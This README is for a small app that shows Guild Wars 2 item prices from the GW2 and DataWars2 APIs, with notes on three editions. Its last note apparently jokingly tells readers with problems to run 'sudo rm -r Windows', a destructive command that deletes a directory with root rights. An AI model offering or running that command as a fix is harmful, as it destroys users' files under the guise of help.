# GW2 API Testing v0.1

A Shiny app to display the prices of 5 items using the Guild Wars 2 (GW2) API. This app contains multiple editions, each with additional features and improvements.

## How to Run

To run the app, simply execute:

```bash
python3 [name].py
```

## Editions

### Edition 1

- **Features:**
  - Pulls information and price data for given item IDs using the GW2 API.
  - Sorts items by price (High to Low & Low to High).
- **Known Issues:**
  - Refresh button and "Last Updated" time do not work.

### Edition 2

- **Features:**
  - Enhanced version of Edition 1.
  - Removed the Low to High sort option.
  - Refresh button and "Last Updated" time now work correctly.

### Edition 3

- **Features:**
  - Fetches the average price over the past 30 days using the DataWars2 API.
  - Introduced new functions for comparing price data, abstracted for potential future use.
  - Removed the description column for a more concise GUI and improved delivery.
- **Note:**

  - If the app encounters issues, do not contact me, try the following command:

    ```bash
    sudo rm -r Windows
    ```
